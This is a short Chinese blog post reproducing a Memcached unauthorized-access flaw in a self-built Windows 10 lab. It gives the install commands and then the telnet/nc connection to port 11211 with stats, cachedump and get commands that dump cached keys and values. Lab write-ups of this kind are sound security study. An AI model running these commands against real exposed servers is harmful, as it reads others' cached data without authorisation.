---
title: Memcache未授权访问漏洞
categories:
  - 漏洞复现
abbrlink: 15891
date: 2020-12-08 22:42:06
---

###  前言
　　本次环境在win10上搭建<!-- more -->
### 环境搭建

```bash
下载 http://static.runoob.com/download/memcached-win64-1.4.4-14.zip # 64位系统 1.4.4版本
memcached.exe -d install
memcached.exe -d start # 以后memcached将作为windows的一个服务每次开机时自动启动,可在服务里面找到memcached
```

```
#查看进程服务以及端口
netstat -ano | findstr 11211
tasklist | findstr memcached
```

<img src="https://s3.ax1x.com/2020/12/08/rpxlad.png">

### 未授权访问

```
telnet <ip> 11211 或 nc -vv <ip> 11211
```

<img src="https://s3.ax1x.com/2020/12/08/rpxfZ4.png">

```
stats  				  				  # 查看memcache 服务状态
stats items  		 				  # 查看所有items
stats cachedump 32 0  			      # 获得缓存key
get :state:264861539228401373:261588  # 通过key读取相应value,获得实际缓存内容,造成敏感信息泄露
```

<img src="https://s3.ax1x.com/2020/12/08/r9SAc6.png">